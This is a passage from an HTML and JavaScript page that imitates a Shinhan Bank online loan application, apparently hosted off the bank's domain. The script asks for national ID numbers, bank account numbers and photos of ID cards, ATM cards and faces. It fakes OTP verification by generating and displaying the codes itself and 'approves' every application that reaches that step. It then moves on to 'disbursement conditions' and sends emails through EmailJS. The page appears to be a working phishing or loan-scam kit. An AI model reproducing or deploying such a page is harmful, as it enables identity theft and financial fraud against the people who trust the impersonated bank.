                        <p>Thông tin chi tiết đã được gửi đến email của bạn.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToContract()">Tiếp Tục</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock'">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: support@shinhan.com.vn</p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/130x50?text=Logo+Shinhan'">
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        (function() {
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        function showToast(message, isSuccess = true) {
            try {
                const toast = document.getElementById('emailToast');
                const toastBody = toast.querySelector('.toast-body');
                toastBody.textContent = message;
                toast.classList.remove('bg-success', 'bg-danger');
                toast.classList.add(isSuccess ? 'bg-success' : 'bg-danger');
                const bsToast = new bootstrap.Toast(toast);
                bsToast.show();
            } catch (error) {
                console.error("Lỗi hiển thị toast:", error);
            }
        }

        let formData = {
            contractImage: "https://vaytieudung.github.io/shinhanbank/assets/img/contract_image.png",
            disbursementImage: "https://vaytieudung.github.io/shinhanbank/assets/img/disbursement_image.png",
            fallbackImage: "https://via.placeholder.com/720x1018?text=Hinh+Anh+Mac+Dinh",
            fallbackProfileImage: "https://via.placeholder.com/150x150?text=Anh+Ho+So"
        };

        let userData = {};
        const stepLabels = {
            1: "Bước 1/10: Đăng ký thông tin",
            2: "Bước 2/10: Tải lên giấy tờ tùy thân",
            3: "Bước 3/10: Tải lên thẻ ATM",
            4: "Bước 4/10: Tải lên ảnh khuôn mặt",
            5: "Bước 5/10: Xác minh OTP",
            7: "Bước 6/10: Hồ sơ được duyệt",
            8: "Bước 7/10: Xem hợp đồng",
            '8-1': "Bước 8/10: Ký hợp đồng",
            9: "Bước 9/10: Điều kiện giải ngân",
            10: "Bước 10/10: Hoàn tất"
        };

        function saveToLocalStorage(step) {
            try {
                userData.currentStep = step;
                localStorage.setItem('userData', JSON.stringify(userData));
            } catch (error) {
                console.error("Lỗi lưu localStorage:", error);
                showToast("Lỗi lưu dữ liệu. Vui lòng thử lại!", false);
            }
        }

        function updatePreviewSection() {
            try {
                if (userData.currentStep >= 4 && userData.faceImageUrl) {
                    $('#profileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                    $('#step7ProfileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                } else {
                    $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                    $('#step7ProfileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                }
                if (userData.currentStep >= 7 && userData.contractImageUrl) {
                    $('#contractImagePreview').html(`<img src="${userData.contractImageUrl}" alt="Hình ảnh hợp đồng" />`);
                } else {
                    $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
                }
            } catch (error) {
                console.error("Lỗi cập nhật preview section:", error);
                $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
                $('#step7ProfileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
            }
        }

        function proceedToStep(currentStep, nextStep, progress) {
            try {
                console.log(`Chuyển từ bước ${currentStep} sang ${nextStep}`);
                const $current = $(`#step${currentStep}`);
                const $next = $(`#step${nextStep}`);
                console.log('Current element:', $current.length ? 'Found' : 'Not found');
                console.log('Next element:', $next.length ? 'Found' : 'Not found');
                if (!$current.length || !$next.length) {
                    throw new Error('One or both steps not found in DOM');
                }
                $current.css({ opacity: 0, transform: 'translateY(20px)' });
                setTimeout(() => {
                    console.log('Hiding current step:', currentStep);
                    $current.addClass('hidden');
                    console.log('Showing next step:', nextStep);
                    $next.removeClass('hidden').css({ opacity: 0, transform: 'translateY(20px)' });
                    setTimeout(() => {
                        console.log('Animating next step:', nextStep);
                        $next.css({ opacity: 1, transform: 'translateY(0)' });
                    }, 50);
                }, 300);
                $('#progressBar').css('width', `${progress}%`);
                $('#progressLabel').text(stepLabels[nextStep] || `Bước ${nextStep}/10`);
                userData.currentStep = nextStep;
                saveToLocalStorage(nextStep);
                updatePreviewSection();
                if (nextStep === 7) {
                    renderCanvas('step7ContractCanvas', formData.contractImage, userData);
                } else if (nextStep === 8) {
                    renderCanvas('contractCanvas', formData.contractImage, userData);
                } else if (nextStep === 9) {
                    renderCanvas('disbursementCanvas', formData.disbursementImage, userData);
                    $('#disbursementAccount').text(`${userData.accountNumber || 'Không cung cấp'} (${userData.bankName || 'Không cung cấp'})`);
                }
            } catch (error) {
                console.error(`Lỗi chuyển từ bước ${currentStep} sang ${nextStep}:`, error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
            }
        }

        function goBack(currentStep, prevStep, progress) {
            try {
                if (confirm('Bạn có chắc muốn quay lại bước trước? Dữ liệu đã nhập sẽ được lưu.')) {
                    proceedToStep(currentStep, prevStep, progress);
                }
            } catch (error) {
                console.error(`Lỗi quay lại từ bước ${currentStep} sang ${prevStep}:`, error);
                showToast("Lỗi quay lại bước. Vui lòng thử lại!", false);
            }
        }

        function proceedToContract() {
            proceedToStep(7, 8, 70);
        }

        window.onload = function() {
            try {
                const savedData = localStorage.getItem('userData');
                if (savedData) {
                    userData = JSON.parse(savedData);
                    console.log('Current step:', userData.currentStep);
                    if (userData.isRegistered && userData.loanCode) {
                        showToast("Hồ sơ đã có trên hệ thống. Vui lòng quay lại!", false);
                        $('#registerForm button[type="submit"]').prop('disabled', true);
                        if (userData.currentStep >= 10) {
                            proceedToStep(1, 10, 100);
                        } else if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    } else {
                        $('#fullName').val(userData.fullName || '');
                        $('#idNumber').val(userData.idNumber || '');
                        $('#idIssueDate').val(userData.idIssueDate || '');
                        $('#idIssuePlace').val(userData.idIssuePlace || '');
                        $('#address').val(userData.address || '');
                        $('#occupation').val(userData.occupation || '');
                        $('#income').val(userData.income ? Number(userData.income).toLocaleString('vi-VN') : '');
                        $('#phoneNumber').val(userData.phoneNumber || '');
                        $('#email').val(userData.email || '');
                        $('#loanAmount').val(userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') : '');
                        $('#loanTerm').val(userData.loanTerm || '');
                        $('#loanPurpose').val(userData.loanPurpose || '');
                        $('#accountNumber').val(userData.accountNumber || '');
                        $('#bankName').val(userData.bankName || '');
                        $('#creditHistory').val(userData.creditHistory || '');
                        $('#termsAgree').prop('checked', userData.termsAgree || false);
                        if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    }
                    updatePreviewSection();
                }
                $('[data-bs-toggle="tooltip"]').tooltip();
                $('#phoneNumber').mask('0000000000#');
                $('#accountNumber').mask('0000000000000000');
                $('#idNumber').mask('000000000000');
            } catch (error) {
                console.error("Lỗi khôi phục localStorage:", error);
                showToast("Không thể khôi phục dữ liệu. Vui lòng bắt đầu lại.", false);
                userData = {};
                saveToLocalStorage(1);
                updatePreviewSection();
            }
        };

        function sanitizeInput(value) {
            if (!value) return "Không Cung Cấp";
            return String(value)
                .normalize("NFD")
                .replace(/[\u0300-\u036f]/g, "")
                .replace(/[^a-zA-Z0-9_]/g, "_")
                .replace(/\s+/g, "_");
        }

        function formatNumber(number) {
            if (!number || isNaN(number)) return "0";
            return parseInt(number).toLocaleString('vi-VN');
        }

        function generateContractId() {
            try {
                const date = new Date();
                const randomNum = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${date.getFullYear()}${(date.getMonth() + 1).toString().padStart(2, '0')}${date.getDate().toString().padStart(2, '0')}-${randomNum}`;
            } catch (error) {
                console.error("Lỗi tạo mã hợp đồng:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        function generateRandomCode() {
            try {
                return Math.floor(100000 + Math.random() * 900000).toString();
            } catch (error) {
                console.error("Lỗi tạo mã ngẫu nhiên:", error);
                return "000000";
            }
        }

        function getCurrentDate() {
            try {
                const date = new Date();
                return `${date.getDate().toString().padStart(2, '0')}/${(date.getMonth() + 1).toString().padStart(2, '0')}/${date.getFullYear()}`;
            } catch (error) {
                console.error("Lỗi lấy ngày hiện tại:", error);
                return "01/01/2025";
            }
        }

        function calculateInterestRate(loanAmount) {
            try {
                const amount = parseInt(loanAmount) || 0;
                if (amount <= 50000000) return "12%";
                if (amount <= 200000000) return "11%";
                return "10%";
            } catch (error) {
                console.error("Lỗi tính lãi suất:", error);
                return "12%";
            }
        }

        function calculateMonthlyPayment(loanAmount, loanTerm) {
            try {
                const monthlyInterestRate = 0.01;
                const totalInterest = (parseInt(loanAmount) || 0) * monthlyInterestRate * (parseInt(loanTerm) || 12);
                const totalAmount = (parseInt(loanAmount) || 0) + totalInterest;
                const monthlyPayment = totalAmount / (parseInt(loanTerm) || 12);
                return Math.round(monthlyPayment).toLocaleString('vi-VN');
            } catch (error) {
                console.error("Lỗi tính toán khoản góp:", error);
                return "0";
            }
        }

        async function validateImage(file, inputId) {
            try {
                const maxSize = 5 * 1024 * 1024; // 5MB
                const minResolution = 300; // 300x300px
                const allowedTypes = ['image/jpeg', 'image/png'];
                if (!file) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp ảnh!", false);
                    return false;
                }
                if (!allowedTypes.includes(file.type)) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp JPEG hoặc PNG!", false);
                    return false;
                }
                if (file.size > maxSize) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Tệp ảnh không được vượt quá 5MB!", false);
                    return false;
                }
                const img = new Image();
                return new Promise((resolve, reject) => {
                    img.onload = function() {
                        if (img.width < minResolution || img.height < minResolution) {
                            $(`#${inputId}`).addClass('is-invalid');
                            showToast(`Ảnh phải có độ phân giải tối thiểu ${minResolution}x${minResolution}px!`, false);
                            resolve(false);
                        } else {
                            $(`#${inputId}`).removeClass('is-invalid');
                            resolve(true);
                        }
                    };
                    img.onerror = function() {
                        $(`#${inputId}`).addClass('is-invalid');
                        showToast("Lỗi tải ảnh. Vui lòng thử lại!", false);
                        reject(new Error("Lỗi tải ảnh"));
                    };
                    img.src = URL.createObjectURL(file);
                });
            } catch (error) {
                console.error(`Lỗi validate ảnh ${inputId}:`, error);
                $(`#${inputId}`).addClass('is-invalid');
                showToast("Lỗi xử lý ảnh. Vui lòng thử lại!", false);
                return false;
            }
        }

        async function compressImage(file) {
            try {
                const maxSize = 5 * 1024 * 1024; // 5MB
                const quality = 0.7; // Giảm chất lượng để giảm kích thước
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const img = new Image();
                img.src = URL.createObjectURL(file);
                await new Promise((resolve, reject) => {
                    img.onload = resolve;
                    img.onerror = () => reject(new Error("Lỗi tải ảnh để nén"));
                });
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
                const compressedDataUrl = canvas.toDataURL('image/jpeg', quality);
                const compressedBlob = await (await fetch(compressedDataUrl)).blob();
                const compressedFile = new File([compressedBlob], file.name, { type: 'image/jpeg' });
                if (compressedFile.size > maxSize) {
                    showToast("Ảnh nén vẫn vượt quá 5MB!", false);
                    return null;
                }
                return compressedFile;
            } catch (error) {
                console.error("Lỗi nén ảnh:", error);
                showToast("Lỗi nén ảnh. Vui lòng thử lại!", false);
                return null;
            }
        }

        $('#registerForm').on('submit', async function(e) {
            try {
                e.preventDefault();
                const $form = $(this);
                const $submitBtn = $form.find('button[type="submit"]');
                $submitBtn.addClass('loading').prop('disabled', true);
                userData = {
                    fullName: $('#fullName').val().trim() || 'Không cung cấp',
                    idNumber: $('#idNumber').val().trim() || 'Không cung cấp',
                    idIssueDate: $('#idIssueDate').val() || 'Không cung cấp',
                    idIssuePlace: $('#idIssuePlace').val().trim() || 'Không cung cấp',
                    address: $('#address').val().trim() || 'Không cung cấp',
                    occupation: $('#occupation').val() || 'Không cung cấp',
                    income: parseInt($('#income').val().replace(/,/g, '')) || 0,
                    phoneNumber: $('#phoneNumber').val().trim() || 'Không cung cấp',
                    email: $('#email').val().trim() || 'Không cung cấp',
                    loanAmount: parseInt($('#loanAmount').val().replace(/,/g, '')) || 0,
                    loanTerm: $('#loanTerm').val() || '12',
                    loanPurpose: $('#loanPurpose').val() || 'Không cung cấp',
                    accountNumber: $('#accountNumber').val().trim() || 'Không cung cấp',
                    bankName: $('#bankName').val() || 'Không cung cấp',
                    creditHistory: $('#creditHistory').val() || 'Không cung cấp',
                    termsAgree: $('#termsAgree').is(':checked'),
                    isRegistered: true,
                    loanCode: generateRandomCode(),
                    interestRate: calculateInterestRate($('#loanAmount').val()),
                    monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val()),
                    registrationDate: getCurrentDate()
                };
                saveToLocalStorage(2);
                await new Promise(resolve => setTimeout(resolve, 500));
                showToast("Thông tin đã được lưu!", true);
                proceedToStep(1, 2, 20);
                $submitBtn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý form đăng ký:", error);
                showToast("Lỗi xử lý đăng ký. Vui lòng thử lại!", false);
                $submitBtn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#idFrontImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#idFrontInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                } else {
                    $('#idFrontInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                }
            } catch (error) {
                console.error("Lỗi xử lý file mặt trước:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });

        $('#idBackImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#idBackInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                } else {
                    $('#idBackInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                }
            } catch (error) {
                console.error("Lỗi xử lý file mặt sau:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });

        $('#proceedToStep3Btn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const idFrontImage = $('#idFrontImage')[0].files[0];
                const idBackImage = $('#idBackImage')[0].files[0];
                if (!idFrontImage || !idBackImage) {
                    showToast("Vui lòng tải lên cả hai hình ảnh!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const isFrontValid = await validateImage(idFrontImage, 'idFrontImage');
                const isBackValid = await validateImage(idBackImage, 'idBackImage');
                if (!isFrontValid || !isBackValid) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const compressedFront = await compressImage(idFrontImage);
                const compressedBack = await compressImage(idBackImage);
                if (!compressedFront || !compressedBack) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.idFrontImage = compressedFront;
                userData.idBackImage = compressedBack;
                saveToLocalStorage(3);
                showToast("Hình ảnh đã được lưu!", true);
                proceedToStep(2, 3, 30);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý bước 2:", error);
                showToast("Lỗi xử lý hình ảnh. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#atmImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#atmImageInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                } else {
                    $('#atmImageInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                }
            } catch (error) {
                console.error("Lỗi xử lý file thẻ ATM:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });

        $('#proceedToStep4Btn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const atmImage = $('#atmImage')[0].files[0];
                if (!atmImage) {
                    showToast("Vui lòng tải lên hình ảnh thẻ ATM!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const isValid = await validateImage(atmImage, 'atmImage');
                if (!isValid) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const compressedAtm = await compressImage(atmImage);
                if (!compressedAtm) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.atmImage = compressedAtm;
                saveToLocalStorage(4);
                showToast("Hình ảnh thẻ ATM đã được lưu!", true);
                proceedToStep(3, 4, 40);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý bước 3:", error);
                showToast("Lỗi xử lý hình ảnh. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#faceImage').on('change', function() {
            try {
                const file = this.files[0];
                if (file) {
                    $('#faceImageInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        userData.faceImageUrl = e.target.result;
                        $('#profileImagePreview').html(`<img src="${e.target.result}" alt="Hình ảnh khuôn mặt" />`);
                        saveToLocalStorage(userData.currentStep || 4);
                    };
                    reader.onerror = function() {
                        showToast("Lỗi đọc ảnh khuôn mặt!", false);
                    };
                    reader.readAsDataURL(file);
                } else {
                    $('#faceImageInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
                    $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                }
            } catch (error) {
                console.error("Lỗi xử lý file ảnh khuôn mặt:", error);
                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
            }
        });

        $('#proceedToOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const faceImage = $('#faceImage')[0].files[0];
                if (!faceImage) {
                    showToast("Vui lòng tải lên ảnh khuôn mặt!", false);
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const isValid = await validateImage(faceImage, 'faceImage');
                if (!isValid) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const compressedFace = await compressImage(faceImage);
                if (!compressedFace) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                const otp = generateRandomCode();
                $('#otpDisplay').text(otp);
                userData.otp = otp;
                userData.faceImage = compressedFace;
                saveToLocalStorage(5);
                showToast("Mã OTP đã được gửi!", true);
                proceedToStep(4, 5, 50);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xử lý bước 4:", error);
                showToast("Lỗi xử lý ảnh khuôn mặt. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        function copyOtp() {
            try {
                const otp = $('#otpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(() => {
                    showToast("Lỗi khi sao chép mã OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi sao chép OTP:", error);
                showToast("Lỗi khi sao chép mã OTP!", false);
            }
        }

        function resendOtp() {
            try {
                const newOtp = generateRandomCode();
                $('#otpDisplay').text(newOtp);
                userData.otp = newOtp;
                saveToLocalStorage(5);
                showToast("Mã OTP mới đã được gửi!", true);
            } catch (error) {
                console.error("Lỗi gửi lại OTP:", error);
                showToast("Lỗi gửi lại OTP. Vui lòng thử lại!", false);
            }
        }

        function copySignOtp() {
            try {
                const otp = $('#signOtpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(() => {
                    showToast("Lỗi khi sao chép mã OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi sao chép OTP:", error);
                showToast("Lỗi khi sao chép mã OTP!", false);
            }
        }

        function resendSignOtp() {
            try {
                const newOtp = generateRandomCode();
                $('#signOtpDisplay').text(newOtp);
                userData.signOtp = newOtp;
                saveToLocalStorage('8-1');
                showToast("Mã OTP mới đã được gửi!", true);
            } catch (error) {
                console.error("Lỗi gửi lại OTP ký hợp đồng:", error);
                showToast("Lỗi gửi lại OTP. Vui lòng thử lại!", false);
            }
        }

        async function sendEmail(serviceId, templateId, params) {
            try {
                await emailjs.send(serviceId, templateId, params);
                showToast("Email đã được gửi thành công!", true);
            } catch (error) {
                console.error("Lỗi gửi email:", error);
                showToast("Lỗi gửi email. Vui lòng thử lại!", false);
                throw error;
            }
        }

        $('#verifyOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const enteredOtp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
                if (enteredOtp === userData.otp) {
                    showToast("Xác minh OTP thành công!", true);
                    const emailParams = {
                        to_email: userData.email,
                        full_name: userData.fullName,
                        loan_amount: formatNumber(userData.loanAmount) + ' VND',
                        loan_code: userData.loanCode,
                        monthly_payment: userData.monthlyPayment,
                        interest_rate: userData.interestRate,
                        loan_term: userData.loanTerm + ' tháng'
                    };
                    await sendEmail('service_loan', 'template_approval', emailParams);
                    $('#confirmationMessage').text(`Hồ sơ vay của bạn đã được duyệt với số tiền ${formatNumber(userData.loanAmount)} VND.`);
                    $('#confirmationEmail').text(userData.email);
                    $('#modalFullName').text(`Họ và tên: ${userData.fullName}`);
                    $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                    $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
                    const successModal = new bootstrap.Modal(document.getElementById('successModal'));
                    successModal.show();
                    userData.contractImageUrl = formData.contractImage;
                    saveToLocalStorage(7);
                    proceedToStep(5, 7, 60);
                } else {
                    showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
                }
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xác minh OTP:", error);
                showToast("Lỗi xác minh OTP. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToSignContractBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const signOtp = Math.floor(100000 + Math.random() * 900000);
                $('#signOtpDisplay').text(signOtp);
                userData.signOtp = signOtp.toString();
                saveToLocalStorage(8);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(8, '8-1', 80);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi chuyển sang ký hợp đồng:", error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#verifySignOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const enteredSignOtp = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
                if (enteredSignOtp === userData.signOtp) {
                    showToast("Xác nhận OTP ký hợp đồng thành công!", true);
                    const emailParams = {
                        to_email: userData.email,
                        full_name: userData.fullName,
                        loan_amount: formatNumber(userData.loanAmount) + ' VND',
                        loan_code: userData.loanCode,
                        contract_id: generateContractId(),
                        signing_date: getCurrentDate(),
                        monthly_payment: userData.monthlyPayment,
                        interest_rate: userData.interestRate,
                        loan_term: userData.loanTerm + ' tháng'
                    };
                    await sendEmail('service_loan', 'template_contract', emailParams);
                    await new Promise(resolve => setTimeout(resolve, 500));
                    proceedToStep('8-1', 9, 90);
                } else {
                    showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
                }
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xác minh OTP ký hợp đồng:", error);
                showToast("Lỗi xác minh OTP. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToFinalStepBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const emailParams = {
                    to_email: userData.email,
                    full_name: userData.fullName,
                    loan_amount: formatNumber(userData.loanAmount) + ' VND',
                    loan_code: userData.loanCode,
                    account_number: userData.accountNumber,
                    bank_name: userData.bankName,
                    disbursement_date: getCurrentDate(),
                    monthly_payment: userData.monthlyPayment
                };
                await sendEmail('service_loan', 'template_disbursement', emailParams);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(9, 10, 100);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi hoàn tất:", error);
                showToast("Lỗi hoàn tất. Vui lòng thử lại!", false);
                $btn.removeClass('loading').prop('disabled', false);
            }
        });

        function renderCanvas(canvasId, imageUrl, data) {
            try {
                const canvas = document.getElementById(canvasId);
                if (!canvas) {
                    console.error(`Canvas ${canvasId} không tồn tại`);
                    return;
                }
                const ctx = canvas.getContext('2d');
                const img = new Image();
                canvas.classList.add('loading');
                img.crossOrigin = "Anonymous";
                img.onload = function() {
                    canvas.width = img.width;
                    canvas.height = img.height;
                    ctx.drawImage(img, 0, 0);
                    ctx.font = 'bold 30px Roboto';
                    ctx.fillStyle = '#003087';
                    ctx.textAlign = 'left';
                    const fields = [
                        { x: 100, y: 100, text: `Họ và Tên: ${data.fullName || 'Không Cung Cấp'}` },
                        { x: 100, y: 150, text: `Số CMND/CCCD: ${data.idNumber || 'Không Cung Cấp'}` },
                        { x: 100, y: 200, text: `Số Tiền Vay: ${formatNumber(data.loanAmount)} VND` },
                        { x: 100, y: 250, text: `Kỳ Hạn: ${data.loanTerm || 'Không Cung Cấp'} tháng` },
                        { x: 100, y: 300, text: `Mã Hồ Sơ: ${data.loanCode || 'Không Cung Cấp'}` },
                        { x: 100, y: 350, text: `Ngày Đăng Ký: ${data.registrationDate || 'Không Cung Cấp'}` }
                    ];
                    fields.forEach(field => {
                        ctx.fillText(field.text, field.x, field.y);
                    });
                    canvas.classList.remove('loading');
                };
                img.onerror = function() {
                    console.error(`Lỗi tải ảnh ${imageUrl}`);
                    img.src = formData.fallbackImage;
                };
                img.src = imageUrl;
            } catch (error) {
                console.error(`Lỗi render canvas ${canvasId}:`, error);
                showToast("Lỗi hiển thị tài liệu. Vui lòng thử lại!", false);
            }
        }

        $('.otp-digit').on('input', function() {
            try {
                const $this = $(this);
                const value = $this.val();
                if (value.length === 1 && $this.next('.otp-digit').length) {
                    $this.next('.otp-digit').focus();
                }
                if (!/^[0-9]$/.test(value)) {
                    $this.val('');
                }
            } catch (error) {
                console.error("Lỗi xử lý OTP input:", error);
            }
        });

        $('.otp-digit').on('keydown', function(e) {
            try {
                if (e.key === 'Backspace' && !$(this).val() && $(this).prev('.otp-digit').length) {
                    $(this).prev('.otp-digit').focus();
                }
            } catch (error) {
                console.error("Lỗi xử lý OTP keydown:", error);
            }
        });
    </script>
</body>
</html>
